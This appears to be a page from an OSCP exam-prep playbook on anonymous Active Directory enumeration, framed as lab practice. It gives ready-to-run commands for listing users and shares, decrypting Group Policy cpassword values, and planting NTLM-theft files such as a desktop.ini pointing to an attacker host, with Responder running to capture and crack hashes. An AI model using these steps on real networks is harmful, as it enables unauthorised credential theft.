# AD - Anonymous Enum

**Step 36 of 50 · AD**

*Test whether RPC, LDAP, or SMB exposes users or shares without credentials.*

## Run this

> **Why:** This query tests the exposed directory or share interface for accounts, permissions, and readable data that determine the next route.
```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP \
  -b "$(echo $Domain | awk -F. '{for(i=1;i<=NF;i++) printf "DC="$i(i<NF?",":""); print ""}')" \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName | grep sAMAccountName
smbclient -N -L //$BoxIP
```

If anonymous SMB exposes a readable `Replication` share, copy the policy tree and inspect Group Policy Preferences XML for a managed `cpassword` value:

```bash
smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'
mv $Domain $BoxDir/loot/Replication
rg -n 'cpassword|userName' $BoxDir/loot/Replication
gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')"
```

> [!warning] 💡
> A readable `Replication` share can disclose a reversible GPP-managed credential even when anonymous RPC and subtree LDAP enumeration are denied. Save the policy tree, recover the credential offline, and validate it at Step 40 · [[AD - Credential Validation]].

## Example output

```

enumdomusers: NT_STATUS_ACCESS_DENIED
# LDAP bind accepted, no user objects
Anonymous login successful for IPC$
```
## What did you get?

- [ ] RPC or LDAP returned users → **Save usernames and go to Step 38 · [[AD - AS-REP Roasting]]**
- [ ] SMB exposed a useful share → **Run `smbclient //$BoxIP/$Share -N -c 'recurse ON; prompt OFF; mget *'`, save the files, then go to Step 42 · [[AD - Group Triage]]**
- [ ] All three returned nothing useful → **Go to Step 37 · [[AD - Web Enum]]**
- [ ] Anonymous access was denied everywhere → **Go to Step 37 · [[AD - Web Enum]]**
- [ ] A writable SMB share is found → **Run `sudo responder -I tun0`, upload the authorized `desktop.ini` with `smbclient //$BoxIP/$Share -N -c 'put desktop.ini'`, then crack any captured response and validate it at Step 40 · [[AD - Credential Validation]]**
- [ ] Anonymous `Replication` is readable → **Run `smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'`, inspect `Groups.xml` for `cpassword`, run `gpp-decrypt`, then validate the recovered account at Step 40 · [[AD - Credential Validation]]**

## Notes

RPC and LDAP can return different account lists. Keep both outputs.

If a writable share is found and users are likely to browse it, place an NTLM theft file in the share:

> **Why:** This query tests the exposed directory or share interface for accounts, permissions, and readable data that determine the next route.
```bash
python3 $ToolDir/ntlm_theft.py -g all -s $LocalIP -f invoice
smbclient //$BoxIP/Shared -U "$Domain/$Username%$Password" -c "lcd $BoxDir/loot/ntlmtheft/invoice; put desktop.ini; put invoice.library-ms"
```

The file must be in the share root with the exact generated filename. Keep Responder running and wait for an inbound authentication.

## Gotcha

> [!warning] 💡
> Empty anonymous AD enumeration is not a dead end. The website may list the employee names needed to build a roasting list.

> [!warning] 💡
> desktop.ini format for NTLM theft:
> ```ini
> [.ShellClassInfo]
> IconResource=\\$LocalIP\share\icon.ico
> ```
> The file must be named exactly desktop.ini and placed in the root of the share.
## Seen in
- *(no write-up yet)*
- [[OSCP/BOXES/WRITE UPS/AD/Active|Active]] -- anonymous SMB exposed the readable Replication share and GPP policy files

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
